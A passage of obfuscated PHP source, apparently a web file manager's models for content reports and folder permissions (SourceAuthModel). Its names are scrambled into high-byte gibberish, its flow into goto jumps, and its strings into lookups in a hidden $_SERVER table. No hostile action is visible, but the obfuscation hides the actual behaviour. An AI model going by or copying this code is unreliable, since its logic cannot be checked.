$D¯óÙ×Ô¥ˆ[33], $D¯óÙ×Ô¥ˆ[1551]); $aÜÔ¯‡Ù = Model($D¯óÙ×Ô¥ˆ[519])->userListInfo(array_unique($E˜ÇÜˆ–À)); goto DáÈéŠæƒ; B¿Á©µ„­è: } private function _makeOrder($aé×®Ê ‘ä = '') { goto A¼ª°ŸÄÉò; BÒÓÇİŒ´: $aÌ àËõ›Ô = Input::get($BßŠ“‰î[435], $BßŠ“‰î[7], $BßŠ“‰î[416], $F¶ëÄ‚†Û‰); $eÁŒëîÌ = Input::get($BßŠ“‰î[436], $BßŠ“‰î[7], $BßŠ“‰î[1878], array($BßŠ“‰î[1802], $BßŠ“‰î[430])); $eÁŒëîÌ = $aé®‰‚Ğ˜[$eÁŒëîÌ]; goto bà¶ö‘ÙŞÒ; A¼ª°ŸÄÉò: $BßŠ“‰î =& $_SERVER[ä°„ä°º]; $F¶ëÄ‚†Û‰ = array($BßŠ“‰î[194], $BßŠ“‰î[476], $BßŠ“‰î[1866], $BßŠ“‰î[1867]); $aé®‰‚Ğ˜ = array($BßŠ“‰î[428] => $BßŠ“‰î[429], $BßŠ“‰î[430] => $BßŠ“‰î[431]); goto BÒÓÇİŒ´; bà¶ö‘ÙŞÒ: $aé×®Ê ‘ä = $aé×®Ê ‘ä . "{$aÌ àËõ›Ô}\x20{$eÁŒëîÌ}"; return $this->order($aé×®Ê ‘ä); goto AøòÏàë½‚; AøòÏàë½‚: } public function reportAdd($dô¯ÑÓŸ”š) { $f°´ò¡ƒ´ =& $_SERVER[ä°„ä°º]; $F—ÎÒŠÃœ¶ = array($f°´ò¡ƒ´[468] => $dô¯ÑÓŸ”š[$f°´ò¡ƒ´[468]], $f°´ò¡ƒ´[1551] => USER_ID); if (Model($f°´ò¡ƒ´[1874])->where($F—ÎÒŠÃœ¶)->find()) { return !1; } $C¬”íÛØí§ = array($f°´ò¡ƒ´[468] => $dô¯ÑÓŸ”š[$f°´ò¡ƒ´[468]], $f°´ò¡ƒ´[1454] => $dô¯ÑÓŸ”š[$f°´ò¡ƒ´[1454]], $f°´ò¡ƒ´[395] => $dô¯ÑÓŸ”š[$f°´ò¡ƒ´[395]], $f°´ò¡ƒ´[447] => $dô¯ÑÓŸ”š[$f°´ò¡ƒ´[447]], $f°´ò¡ƒ´[1551] => USER_ID, $f°´ò¡ƒ´[29] => $dô¯ÑÓŸ”š[$f°´ò¡ƒ´[29]], $f°´ò¡ƒ´[431] => $dô¯ÑÓŸ”š[$f°´ò¡ƒ´[431]]); return Model($f°´ò¡ƒ´[1874])->add($C¬”íÛØí§); } public function reportList($c’œªŸ²‡¼) { goto Dëƒ©Ş˜”; fãÈ‰Ú…„: if (empty($f÷ñÇ¨…˜[$aê³Ÿ¸¨«Ø[367]])) { return array(); } $eèç†¼ˆª¢ = array_to_keyvalue_group($f÷ñÇ¨…˜[$aê³Ÿ¸¨«Ø[367]], $aê³Ÿ¸¨«Ø[733], $aê³Ÿ¸¨«Ø[468]); if (!empty($eèç†¼ˆª¢[0])) { $c’œªŸ²‡¼ = $eèç†¼ˆª¢[0]; $aÉµÒÃğ ª = array($aê³Ÿ¸¨«Ø[468] => array($aê³Ÿ¸¨«Ø[7], $c’œªŸ²‡¼)); $Dõ³¶ì•äõ = $this->where($aÉµÒÃğ ª)->field($aê³Ÿ¸¨«Ø[468])->select(); $Dõ³¶ì•äõ = array_to_keyvalue($Dõ³¶ì•äõ, $aê³Ÿ¸¨«Ø[33], $aê³Ÿ¸¨«Ø[468]); $aßŠŠ¬—¢ = array_diff($c’œªŸ²‡¼, $Dõ³¶ì•äõ); if (!empty($aßŠŠ¬—¢)) { foreach ($f÷ñÇ¨…˜[$aê³Ÿ¸¨«Ø[367]] as $dÉÔÃï‰Úê => $ağÛ÷¢é¬™) { if (in_array($ağÛ÷¢é¬™[$aê³Ÿ¸¨«Ø[468]], $aßŠŠ¬—¢)) { unset($f÷ñÇ¨…˜[$aê³Ÿ¸¨«Ø[367]][$dÉÔÃï‰Úê]); } } } } goto cäÁ’ø­ºó; F˜è“‚‹¸ˆ: if (isset($c’œªŸ²‡¼[$aê³Ÿ¸¨«Ø[29]]) && in_array($c’œªŸ²‡¼[$aê³Ÿ¸¨«Ø[29]], array($aê³Ÿ¸¨«Ø[87], $aê³Ÿ¸¨«Ø[1879], $aê³Ÿ¸¨«Ø[1880], $aê³Ÿ¸¨«Ø[1881], $aê³Ÿ¸¨«Ø[1882]))) { $aÉµÒÃğ ª[$aê³Ÿ¸¨«Ø[29]] = $c’œªŸ²‡¼[$aê³Ÿ¸¨«Ø[29]]; } if (isset($c’œªŸ²‡¼[$aê³Ÿ¸¨«Ø[733]]) && in_array($c’œªŸ²‡¼[$aê³Ÿ¸¨«Ø[733]], array($aê³Ÿ¸¨«Ø[191], $aê³Ÿ¸¨«Ø[87], $aê³Ÿ¸¨«Ø[1879], $aê³Ÿ¸¨«Ø[1880]))) { $aÉµÒÃğ ª[$aê³Ÿ¸¨«Ø[733]] = $c’œªŸ²‡¼[$aê³Ÿ¸¨«Ø[733]]; } $Dè¼À˜Â× = Input::get($aê³Ÿ¸¨«Ø[436], $aê³Ÿ¸¨«Ø[7], $aê³Ÿ¸¨«Ø[1878], array($aê³Ÿ¸¨«Ø[1802], $aê³Ÿ¸¨«Ø[430])); goto D¸¸öÒÉ†Ô; D¸¸öÒÉ†Ô: $D˜…¶½ëç§ = array($aê³Ÿ¸¨«Ø[428] => $aê³Ÿ¸¨«Ø[429], $aê³Ÿ¸¨«Ø[430] => $aê³Ÿ¸¨«Ø[431]); $AëäŞÒË¬â = $aê³Ÿ¸¨«Ø[1883] . $D˜…¶½ëç§[$Dè¼À˜Â×]; $f÷ñÇ¨…˜ = Model($aê³Ÿ¸¨«Ø[1874])->where($aÉµÒÃğ ª)->order($AëäŞÒË¬â)->selectPage(20); goto fãÈ‰Ú…„; cäÁ’ø­ºó: $this->_listDataApply($f÷ñÇ¨…˜[$aê³Ÿ¸¨«Ø[367]]); return $f÷ñÇ¨…˜; goto fêâÑ›‰Š; Dëƒ©Ş˜”: $aê³Ÿ¸¨«Ø =& $_SERVER[ä°„ä°º]; $aÉµÒÃğ ª = array(); if ($c’œªŸ²‡¼[$aê³Ÿ¸¨«Ø[744]]) { $B†»©›˜¦ = $c’œªŸ²‡¼[$aê³Ÿ¸¨«Ø[476]] ? $c’œªŸ²‡¼[$aê³Ÿ¸¨«Ø[476]] : strtotime(date($aê³Ÿ¸¨«Ø[1876])); $aÉµÒÃğ ª[$aê³Ÿ¸¨«Ø[194]] = array($aê³Ÿ¸¨«Ø[331], array($c’œªŸ²‡¼[$aê³Ÿ¸¨«Ø[744]], $B†»©›˜¦)); } goto F˜è“‚‹¸ˆ; fêâÑ›‰Š: } public function reportStatus($CÙÏ„¸ƒ”‰) { goto b‡ïğ¿Ê; Cœ˜ŠÜóˆ˜: return $eØ’ŞÅŒ; goto E†©˜…ÊøÈ; A»Œ‘ñƒêÑ: if (!$A‹—¸¯ô¹¶) { return !1; } $e–İÎá‘Ğ = array($bÊä¹³ÓÕÒ[733] => $CÙÏ„¸ƒ”‰[$bÊä¹³ÓÕÒ[733]]); if ($CÙÏ„¸ƒ”‰[$bÊä¹³ÓÕÒ[733]] == $bÊä¹³ÓÕÒ[1880] && $A‹—¸¯ô¹¶[$bÊä¹³ÓÕÒ[733]] == $bÊä¹³ÓÕÒ[1880]) { $e–İÎá‘Ğ[$bÊä¹³ÓÕÒ[733]] = 0; } goto D ä›—ì¦–; D ä›—ì¦–: $eØ’ŞÅŒ = Model($bÊä¹³ÓÕÒ[1874])->where($dŸ©‚ƒ¡èŒ)->save($e–İÎá‘Ğ); if ($CÙÏ„¸ƒ”‰[$bÊä¹³ÓÕÒ[733]] == $bÊä¹³ÓÕÒ[1879]) { if ($A‹—¸¯ô¹¶[$bÊä¹³ÓÕÒ[447]] != $bÊä¹³ÓÕÒ[191] && $this->shareFileMeta($A‹—¸¯ô¹¶[$bÊä¹³ÓÕÒ[447]])) { $this->shareFileMeta($A‹—¸¯ô¹¶[$bÊä¹³ÓÕÒ[447]], 0); } $this->remove($A‹—¸¯ô¹¶[$bÊä¹³ÓÕÒ[468]]); return !0; } if ($eØ’ŞÅŒ && $CÙÏ„¸ƒ”‰[$bÊä¹³ÓÕÒ[733]] == $bÊä¹³ÓÕÒ[1880]) { $aŠæÒ©Ã¥‚ = $e–İÎá‘Ğ[$bÊä¹³ÓÕÒ[733]] == $bÊä¹³ÓÕÒ[1880] ? 1 : 0; $this->shareFileMeta($A‹—¸¯ô¹¶[$bÊä¹³ÓÕÒ[447]], $aŠæÒ©Ã¥‚); $this->removeByFile($A‹—¸¯ô¹¶[$bÊä¹³ÓÕÒ[447]]); } goto Cœ˜ŠÜóˆ˜; b‡ïğ¿Ê: $bÊä¹³ÓÕÒ =& $_SERVER[ä°„ä°º]; $dŸ©‚ƒ¡èŒ = array($bÊä¹³ÓÕÒ[393] => $CÙÏ„¸ƒ”‰[$bÊä¹³ÓÕÒ[393]]); $A‹—¸¯ô¹¶ = Model($bÊä¹³ÓÕÒ[1874])->where($dŸ©‚ƒ¡èŒ)->field($bÊä¹³ÓÕÒ[1884])->find(); goto A»Œ‘ñƒêÑ; E†©˜…ÊøÈ: } private function removeByFile($a‚‰“âª¢) { goto eÎÍ²Ö¯â†; Cù²º®†³ê: $B›•é¿İÃ‰ = array($A„÷£¬öˆä[395] => array($A„÷£¬öˆä[7], $dÒÍÍéäÙ—), $A„÷£¬öˆä[473] => 1); $FøÊ¸Û¨ = $this->where($B›•é¿İÃ‰)->field($A„÷£¬öˆä[468])->select(); if (empty($FøÊ¸Û¨)) { return; } goto eÃÕÀğõÊ‘; eÃÕÀğõÊ‘: $f‡ôÃÔ ÷­ = array_to_keyvalue($FøÊ¸Û¨, $A„÷£¬öˆä[33], $A„÷£¬öˆä[468]); $this->remove($f‡ôÃÔ ÷­); goto d¿«Û ‘Î×; eÎÍ²Ö¯â†: $A„÷£¬öˆä =& $_SERVER[ä°„ä°º]; $FøÊ¸Û¨ = Model($A„÷£¬öˆä[813])->where(array($A„÷£¬öˆä[447] => $a‚‰“âª¢))->field($A„÷£¬öˆä[395])->select(); $dÒÍÍéäÙ— = array_to_keyvalue($FøÊ¸Û¨, $A„÷£¬öˆä[33], $A„÷£¬öˆä[395]); goto Cù²º®†³ê; d¿«Û ‘Î×: } private function shareFileMeta($b‹£œ×´‘…, $bÃİ‚ã¥„ç = null) { $b«Ğ— ×‹¤ =& $_SERVER[ä°„ä°º]; $fÈÅŞî½»ˆ = array($b«Ğ— ×‹¤[447] => $b‹£œ×´‘…, $b«Ğ— ×‹¤[93] => $b«Ğ— ×‹¤[1885]); if (is_null($bÃİ‚ã¥„ç)) { return Model($b«Ğ— ×‹¤[1886])->where($fÈÅŞî½»ˆ)->find(); } $fÈÅŞî½»ˆ[$b«Ğ— ×‹¤[372]] = $bÃİ‚ã¥„ç; Model($b«Ğ— ×‹¤[1886])->add($fÈÅŞî½»ˆ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\x72\143\145\x5f\141\x75\x74\x68"; public function getAuth($eƒ¾ªè¹í) { goto DÖÀ‹“Ğİ˜; fôã¹Ğ‚é: array_multisort($bå²„ÊŒ, SORT_DESC, $eïÌ¾¤Ç ×); return $eïÌ¾¤Ç ×; goto b¿ˆÌ—ÓŠ; E™½®” œ…: $bå²„ÊŒ = array(); $FğªÚÜ±…– = 2 << 25; foreach ($Aª‡À¿®¯Ñ as $B¬¥å·™É) { goto eÚ„±“¾´è; eÚ„±“¾´è: $f³Ÿ¾¢ê•± = Model($Eï¶¤‰¶[488])->listData($B¬¥å·™É[$Eï¶¤‰¶[1815]]); if (!$f³Ÿ¾¢ê•±) { continue; } $eïÌ¾¤Ç ×[] = $B¬¥å·™É; goto f²—î›‰ÁÛ; A°í˜‘ÌÃ: if ($B¬¥å·™É[$Eï¶¤‰¶[404]] == SourceModel::TYPE_USER && $B¬¥å·™É[$Eï¶¤‰¶[484]] == $Eï¶¤‰¶[191]) { $bĞé“Ã‘Ïç = 0; } $bå²„ÊŒ[] = $f³Ÿ¾¢ê•±[$Eï¶¤‰¶[406]] + $bĞé“Ã‘Ïç; goto Cä†Ç¼†³à; f²—î›‰ÁÛ: $bĞé“Ã‘Ïç = 0; if ($B¬¥å·™É[$Eï¶¤‰¶[404]] == SourceModel::TYPE_GROUP) { $bĞé“Ã‘Ïç = $FğªÚÜ±…– * 2; } if ($B¬¥å·™É[$Eï¶¤‰¶[404]] == SourceModel::TYPE_USER) { $bĞé“Ã‘Ïç = $FğªÚÜ±…–; } goto A°í˜‘ÌÃ; Cä†Ç¼†³à: } goto fôã¹Ğ‚é; DÖÀ‹“Ğİ˜: $Eï¶¤‰¶ =& $_SERVER[ä°„ä°º]; $Aª‡À¿®¯Ñ = $this->sourceAuthSelect($eƒ¾ªè¹í); $eïÌ¾¤Ç × = array(); goto E™½®” œ…; b¿ˆÌ—ÓŠ: } public function sourceAuthSelect($a¤ºªà³Ø) { goto Bç†íÙóœ¯; BÏµèÎ—ˆœ: if (count($FÓ°ÇŠÊŒ‘) == count($a¤ºªà³Ø)) { return $CÀİÉÜ¹ ? $FÓ°ÇŠÊŒ‘[$a¤ºªà³Ø[0]] : $FÓ°ÇŠÊŒ‘; } $C‹Ññ¶Šõ” = $dæ¬á…âŞ´[1887]; $bÔÁæ¡© = array($dæ¬á…âŞ´[395] => array($dæ¬á…âŞ´[7], $a¤ºªà³Ø)); goto AåÛ‹Â‡ ; eËœó«¸„: if ($CÀİÉÜ¹) { $a¤ºªà³Ø = array($a¤ºªà³Ø); } $FÓ°ÇŠÊŒ‘ = array(); foreach ($a¤ºªà³Ø as $EÎ¯…çŠĞñ) { if (isset($DÃÔÓé†ÁË[$EÎ¯…çŠĞñ])) { $FÓ°ÇŠÊŒ‘[$EÎ¯…çŠĞñ] = $DÃÔÓé†ÁË[$EÎ¯…çŠĞñ]; } } goto BÏµèÎ—ˆœ; Bç†íÙóœ¯: $dæ¬á…âŞ´ =& $_SERVER[ä°„ä°º]; static $DÃÔÓé†ÁË = array(); $CÀİÉÜ¹ = is_array($a¤ºªà³Ø) ? !1 : !0; goto eËœó«¸„; AåÛ‹Â‡ : $Aô•›äÃ’ƒ = $this->field($C‹Ññ¶Šõ”)->order($dæ¬á…âŞ´[393])->where($bÔÁæ¡©)->select(); $D¼êºõÉ¶¥ = array_to_keyvalue_group($Aô•›äÃ’ƒ, $dæ¬á…âŞ´[395]); foreach ($a¤ºªà³Ø as $EÎ¯…çŠĞñ) { $DÃÔÓé†ÁË[$EÎ¯…çŠĞñ] = $D¼êºõÉ¶¥[$EÎ¯…çŠĞñ] ? $D¼êºõÉ¶¥[$EÎ¯…çŠĞñ] : array(); } goto bğ•·öœ°; bğ•·öœ°: if ($CÀİÉÜ¹) { return $Aô•›äÃ’ƒ; } return $D¼êºõÉ¶¥; goto AÒÁ‚ŸëÈ‚; AÒÁ‚ŸëÈ‚: } public function setAuth($e×°ÓÆ™Ûù, $BÂéÅ˜ÈéÜ) { goto bƒ¸öÇ¾§; còàÛÇÓ¶‘: return !0; goto Fø¯ÅŞÄ; BèéÙ áÙÄ: if ($C§¾ãâ°¬¬[$EŸÀß˜Ë[404]] != SourceModel::TYPE_GROUP) { return !1; } $Dš§¶±Ãí± = 1; $aÃñ¢ÀãòÎ = $C§¾ãâ°¬¬[$EŸÀß˜Ë[484]]; goto Bçé¾£¾µµ; Bçé¾£¾µµ: if ($aÃñ¢ÀãòÎ != $Dš§¶±Ãí±) { $bâğÔ…ˆ‚ø = array($EŸÀß˜Ë[1720] => $aÃñ¢ÀãòÎ); $f£ºè‰ÃíØ = Model($EŸÀß˜Ë[1801])->field($EŸÀß˜Ë[1551])->where($bâğÔ…ˆ‚ø)->select(); $f£ºè‰ÃíØ = array_to_keyvalue($f£ºè‰ÃíØ, $EŸÀß˜Ë[33], $EŸÀß˜Ë[1551]); } $D…èŸÉ©ËÂ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $fÁĞˆŠ‹ƒ = array(); goto E³ä®•¢éÄ; bƒ¸öÇ¾§: $EŸÀß˜Ë =& $_SERVER[ä°„ä°º]; $C§¾ãâ°¬¬ = Model($EŸÀß˜Ë[1227])->sourceInfo($e×°ÓÆ™Ûù); if (!$C§¾ãâ°¬¬) { return !1; } goto BèéÙ áÙÄ; E³ä®•¢éÄ: foreach ($BÂéÅ˜ÈéÜ as $eÀ¿¦ùÎ›‚) { if (!in_array($eÀ¿¦ùÎ›‚[$EŸÀß˜Ë[404]], $D…èŸÉ©ËÂ)) { show_json(LNG($EŸÀß˜Ë[1888]), !1); } if ($aÃñ¢ÀãòÎ != $Dš§¶±Ãí±) { if ($eÀ¿¦ùÎ›‚[$EŸÀß˜Ë[404]] == SourceModel::TYPE_GROUP) { } if ($eÀ¿¦ùÎ›‚[$EŸÀß˜Ë[484]] != 0 && !in_array($eÀ¿¦ùÎ›‚[$EŸÀß˜Ë[484]], $f£ºè‰ÃíØ)) { } } if ($eÀ¿¦ùÎ›‚[$EŸÀß˜Ë[484]] == 0) { $eÀ¿¦ùÎ›‚[$EŸÀß˜Ë[404]] = SourceModel::TYPE_USER; } $fÁĞˆŠ‹ƒ[] = array($EŸÀß˜Ë[395] => $e×°ÓÆ™Ûù, $EŸÀß˜Ë[404] => intval($eÀ¿¦ùÎ›‚[$EŸÀß˜Ë[404]]), $EŸÀß˜Ë[484] => intval($eÀ¿¦ùÎ›‚[$EŸÀß˜Ë[484]]), $EŸÀß˜Ë[1815] => intval($eÀ¿¦ùÎ›‚[$EŸÀß˜Ë[1815]]) ? intval($eÀ¿¦ùÎ›‚[$EŸÀß˜Ë[1815]]) : 0, $EŸÀß˜Ë[1869] => intval($eÀ¿¦ùÎ›‚[$EŸÀß˜Ë[1869]]) ? intval($eÀ¿¦ùÎ›‚[$EŸÀß˜Ë[1869]]) : -1); } $this->where(array($EŸÀß˜Ë[410] => $e×°ÓÆ™Ûù))->delete(); $this->addAll($fÁĞˆŠ‹ƒ); goto còàÛÇÓ¶‘; Fø¯ÅŞÄ: } public function authClear($d’êÍò†÷) { $eòˆ¶×ç® =& $_SERVER[ä°„ä°º]; $eËßÖˆÆ¹ª = Model($eòˆ¶×ç®[1227])->sourceInfo($d’êÍò†÷); $eÌ¾Ø™¹²¹ = array($d’êÍò†÷); if ($eËßÖˆÆ¹ª[$eòˆ¶×ç®[403]] == $eòˆ¶×ç®[87]) { $DÅÕİ“Ÿªƒ = array($eòˆ¶×ç®[566] => array($eòˆ¶×ç®[525], $eËßÖˆÆ¹ª[$eòˆ¶×ç®[502]] . $d’êÍò†÷ . $eòˆ¶×ç®[526])); $eÌ¾Ø™¹²¹ = Model($eòˆ¶×ç®[1227])->field($eòˆ¶×ç®[410])->where($DÅÕİ“Ÿªƒ)->getField($eòˆ¶×ç®[395], !0); $eÌ¾Ø™¹²¹[] = $d’êÍò†÷; } $this->where(array($eòˆ¶×ç®[410] => array($eòˆ¶×ç®[411], $eÌ¾Ø™¹²¹)))->delete(); return !0; } public function getAllChildren($FÂØìÜÎ°“) { goto e¨ŞˆİÌÖ¬; CšÍ‘™–´˜: if (!$B“«—öƒÔ¦) { return array(); } $dğ¼ãİ¸£ = $e©®×¬‚¤·[1889]; $Dò«–ãÅ±µ = array($e©®×¬‚¤·[395] => array($e©®×¬‚¤·[7], $B“«—öƒÔ¦), $e©®×¬‚¤·[423] => $e©®×¬‚¤·[191]); goto cÖ…¶ÛƒÆ–; e¨ŞˆİÌÖ¬: $e©®×¬‚¤· =& $_SERVER[ä°„ä°º]; $báäŠàèÛ = Model($e©®×¬‚¤·[1227])->sourceInfo($FÂØìÜÎ°“); if ($báäŠàèÛ[$e©®×¬‚¤·[403]] != $e©®×¬‚¤·[87]) { return $this->sourceListAuth(array($FÂØìÜÎ°“)); } goto aÑŠòİ’Øğ; C¬ìÔŠò½Ù: return $this->sourceListAuth($fê¯Ëòìä‰); goto eøóšùÁ˜ª; fÛ¨§„÷öİ: if ($báäŠàèÛ[$e©®×¬‚¤·[478]] == $e©®×¬‚¤·[191] && $báäŠàèÛ[$e©®×¬‚¤·[484]] != $dàšÖÑšñØ) { $EèÈÆ»Ãñƒ = $this->groupChidldAllRootSource($báäŠàèÛ[$e©®×¬‚¤·[484]]); } $B“«—öƒÔ¦ = $this->field($e©®×¬‚¤·[395])->group($e©®×¬‚¤·[395])->select(); $B“«—öƒÔ¦ = array_to_keyvalue($B“«—öƒÔ¦, $e©®×¬‚¤·[33], $e©®×¬‚¤·[395]); goto CšÍ‘™–´˜; cÖ…¶ÛƒÆ–: $b¢‹ï§¥Õ = Model($e©®×¬‚¤·[813])->field($dğ¼ãİ¸£)->where($Dò«–ãÅ±µ)->select(); $fê¯Ëòìä‰ = array($FÂØìÜÎ°“); foreach ($b¢‹ï§¥Õ as $cá—èÒùœ) { foreach ($EèÈÆ»Ãñƒ as $bÈÅçÑÓÎ) { $aãÊÁ©¬×© = $e©®×¬‚¤·[47] . $bÈÅçÑÓÎ . $e©®×¬‚¤·[47]; $f÷Àõ®Çî = $cá—èÒùœ[$e©®×¬‚¤·[502]] . $cá—èÒùœ[$e©®×¬‚¤·[395]] . $e©®×¬‚¤·[47]; if (strstr($f÷Àõ®Çî, $aãÊÁ©¬×©)) { $fê¯Ëòìä‰[] = $cá—èÒùœ[$e©®×¬‚¤·[395]]; break; } } } goto C¬ìÔŠò½Ù; aÑŠòİ’Øğ: if ($báäŠàèÛ[$e©®×¬‚¤·[404]] != SourceModel::TYPE_GROUP) { return array(); } $dàšÖÑšñØ = 1; $EèÈÆ»Ãñƒ = array($FÂØìÜÎ°“); goto fÛ¨§„÷öİ; eøóšùÁ˜ª: } private function sourceListAuth($b£ø™ÑÚ¬Ú) { goto CÖ™™™¤õ¶; C Ô†’Ğˆ¬: array_multisort($eÒÇ“ŠÎ÷Æ, SORT_ASC, $Bæ¦ÄŸï³Ì); return $Bæ¦ÄŸï³Ì; goto AíŒÌ±õ; CÖ™™™¤õ¶: $AÜ›¿À‚”è =& $_SERVER[ä°„ä°º]; $EÍ…éâ·‡‘ = Model($AÜ›¿À‚”è[1227])->sourceListInfo($b£ø™ÑÚ¬Ú, !0); $EÇÃÊ¥µÅ = $this->sourceAuthSelect($b£ø™ÑÚ¬Ú); goto Bå‚†Ÿ§á¨; Bå‚†Ÿ§á¨: $Bæ¦ÄŸï³Ì = array(); $eÒÇ“ŠÎ÷Æ = array(); foreach ($EÍ…éâ·‡‘ as $bì¯Ïìƒª») { goto C‰ÍØì¢Îë; DÁìÕÖÓá: $bì¯Ïìƒª»[$AÜ›¿À‚”è[1890]] = $this->authTargetInfo($A³³È˜¤ÅÊ); $bì¯Ïìƒª»[$AÜ›¿À‚”è[500]] = rtrim($bì¯Ïìƒª»[$AÜ›¿À‚”è[506]], $AÜ›¿À‚”è[8]) . $AÜ›¿À‚”è[8] . ltrim($bì¯Ïìƒª»[$AÜ›¿À‚”è[500]], $AÜ›¿À‚”è[8]); $Bæ¦ÄŸï³Ì[] = $bì¯Ïìƒª»; goto EÂ÷ãÙƒ’Ì; C‰ÍØì¢Îë: unset($bì¯Ïìƒª»[$AÜ›¿À‚”è[434]]); unset($bì¯Ïìƒª»[$AÜ›¿À‚”è[432]]); unset($bì¯Ïìƒª»[$AÜ›¿À‚”è[406]]); goto bÚ‹Áâ‘ê; bÚ‹Áâ‘ê: unset($bì¯Ïìƒª»[$AÜ›¿À‚”è[85]]); $A³³È˜¤ÅÊ = $EÇÃÊ¥µÅ[$bì¯Ïìƒª»[$AÜ›¿À‚”è[395]]]; if (!$A³³È˜¤ÅÊ) { continue; } goto DÁìÕÖÓá; EÂ÷ãÙƒ’Ì: $f—£»Ş‘ = count(explode($AÜ›¿À‚”è[8], trim($bì¯Ïìƒª»[$AÜ›¿À‚”è[500]], $AÜ›¿À‚”è[8]))); $eÒÇ“ŠÎ÷Æ[] = $f—£»Ş‘ + ($bì¯Ïìƒª»[$AÜ›¿À‚”è[29]] == $AÜ›¿À‚”è[77] ? 0 : 1000); goto f§Àµ‘´‚; f§Àµ‘´‚: } goto C Ô†’Ğˆ¬; AíŒÌ±õ: } private function groupChidldAllRootSource($CËçåôµ¹) { $b‰ìà“Ú†Ï =& $_SERVER[ä°„ä°º]; $F“À¥¸Ñ­Å = Model($b‰ìà“Ú†Ï[1891])->groupChildrenAll($CËçåôµ¹); $dµ›÷ôÅé¡ = array($b‰ìà“Ú†Ï[478] => 0, $b‰ìà“Ú†Ï[484] => array($b‰ìà“Ú†Ï[7], $F“À¥¸Ñ­Å), $b‰ìà“Ú†Ï[404] => SourceModel::TYPE_GROUP); $FÊÑñçä¢Ô = Model($b‰ìà“Ú†Ï[813])->field($b‰ìà“Ú†Ï[395])->where($dµ›÷ôÅé¡)->select(); $FÊÑñçä¢Ô = array_to_keyvalue($FÊÑñçä¢Ô, $b‰ìà“Ú†Ï[33], $b‰ìà“Ú†Ï[395]); return $FÊÑñçä¢Ô; } private function authTargetInfo($DöÃø¬ÃÔã) { goto dšôæ ‘ßË; C÷ãô¤Ôô™: return $AÊã×‡ºµ; goto a•­ÛØ¨Œ³; dšôæ ‘ßË: $B«ÂÀè¥™Õ =& $_SERVER[ä°„ä°º]; $AÊã×‡ºµ = array(); $FŒƒ®¡Ñ™Ó = array(); goto CÔÍéààã; CÔÍéààã: $Dø Ïê˜œà = 2 << 25; foreach ($DöÃø¬ÃÔã as $Fµ¹¤„¹ÆÀ) { goto a·øñË¨„‹; E£Ç†êĞßƒ: $dº•©İÃİ³ = 0; if ($Fµ¹¤„¹ÆÀ[$B«ÂÀè¥™Õ[404]] == SourceModel::TYPE_GROUP) { $dº•©İÃİ³ = $Dø Ïê˜œà * 2; } if ($Fµ¹¤„¹ÆÀ[$B«ÂÀè¥™Õ[404]] == SourceModel::TYPE_USER) { $dº•©İÃİ³ = $Dø Ïê˜œà; } goto e…†‡ÓÔòâ; b³âÄµ’»ß: if (!$b«Ìº¥Å…ª) { continue; } $b«Ìº¥Å…ª[$B«ÂÀè¥™Õ[446]] = $b†Ôá‰ªÆö; $AÊã×‡ºµ[] = $b«Ìº¥Å…ª; goto E£Ç†êĞßƒ; a·øñË¨„‹: $b†Ôá‰ªÆö = Model($B«ÂÀè¥™Õ[488])->listData($Fµ¹¤„¹ÆÀ[$B«ÂÀè¥™Õ[1815]]); if (!$b†Ôá‰ªÆö) { continue; } if ($Fµ¹¤„¹ÆÀ[$B«ÂÀè¥™Õ[404]] == SourceModel::TYPE_USER) { $b«Ìº¥Å…ª = Model($B«ÂÀè¥™Õ[494])->getInfoSimpleOuter($Fµ¹¤„¹ÆÀ[$B«ÂÀè¥™Õ[484]]); if ($b«Ìº¥Å…ª[$B«ÂÀè¥™Õ[1551]] == $B«ÂÀè¥™Õ[1106]) { continue; } if ($b«Ìº¥Å…ª[$B«ÂÀè¥™Õ[1551]] == $B«ÂÀè¥™Õ[191]) { $b«Ìº¥Å…ª[$B«ÂÀè¥™Õ[28]] = LNG($B«ÂÀè¥™Õ[1892]); } } else { $b«Ìº¥Å…ª = Model($B«ÂÀè¥™Õ[503])->getInfoSimple($Fµ¹¤„¹ÆÀ[$B«ÂÀè¥™Õ[484]]); } goto b³âÄµ’»ß; e…†‡ÓÔòâ: if ($Fµ¹¤„¹ÆÀ[$B«ÂÀè¥™Õ[404]] == SourceModel::TYPE_USER && $Fµ¹¤„¹ÆÀ[$B«ÂÀè¥™Õ[484]] == $B«ÂÀè¥™Õ[191]) { $dº•©İÃİ³ = 0; } $FŒƒ®¡Ñ™Ó[] = $b†Ôá‰ªÆö[$B«ÂÀè¥™Õ[406]] + $dº•©İÃİ³; goto EÀõî©Ï¥Ê; EÀõî©Ï¥Ê: } array_multisort($FŒƒ®¡Ñ™Ó, SORT_DESC, $AÊã×‡ºµ); goto C÷ãô¤Ôô™; a•­ÛØ¨Œ³: } public function getAllChildrenByUser($DÈŒ»âİÄÚ, $b…ÉĞ˜²ò) { goto c‡ÊàãŸ‚; E­”–šàÍ—: foreach ($EåîÏÑ­Úï as $C‡ƒ¶–„ö—) { $dÉ„Ü—Ú½ = !1; foreach ($C‡ƒ¶–„ö—[$Fˆˆ‹ä‰ ‰[1890]] as $eƒÃ‰÷¡„ö) { if ($eƒÃ‰÷¡„ö[$Fˆˆ‹ä‰ ‰[1551]]) { if ($eƒÃ‰÷¡„ö[$Fˆˆ‹ä‰ ‰[1551]] == $b…ÉĞ˜²ò) { $dÉ„Ü—Ú½ = !0; break; } } if ($eƒÃ‰÷¡„ö[$Fˆˆ‹ä‰ ‰[1720]]) { if ($this->groupContainUser($eƒÃ‰÷¡„ö[$Fˆˆ‹ä‰ ‰[1720]], $b…ÉĞ˜²ò)) { $dÉ„Ü—Ú½ = !0; break; } } } if ($dÉ„Ü—Ú½) { $bñÜ†ğØß[] = $C‡ƒ¶–„ö—; } $b™ÑÚó«à½ = $C‡ƒ¶–„ö—[$Fˆˆ‹ä‰ ‰[395]]; if (isset($DôèàåÀÚ¥[$b™ÑÚó«à½])) { $C‡ƒ¶–„ö—[$Fˆˆ‹ä‰ ‰[1890]][] = $DôèàåÀÚ¥[$b™ÑÚó«à½][0]; $DôèàåÀÚ¥[$b™ÑÚó«à½] = !1; } } $DôèàåÀÚ¥ = array_filter(array_values($DôèàåÀÚ¥)); $bñÜ†ğØß = array_merge($DôèàåÀÚ¥, $bñÜ†ğØß); goto A÷¤ğĞ¯¿Ã; c‡ÊàãŸ‚: $Fˆˆ‹ä‰ ‰ =& $_SERVER[ä°„ä°º]; $fØÂÍåáŞ = Model($Fˆˆ‹ä‰ 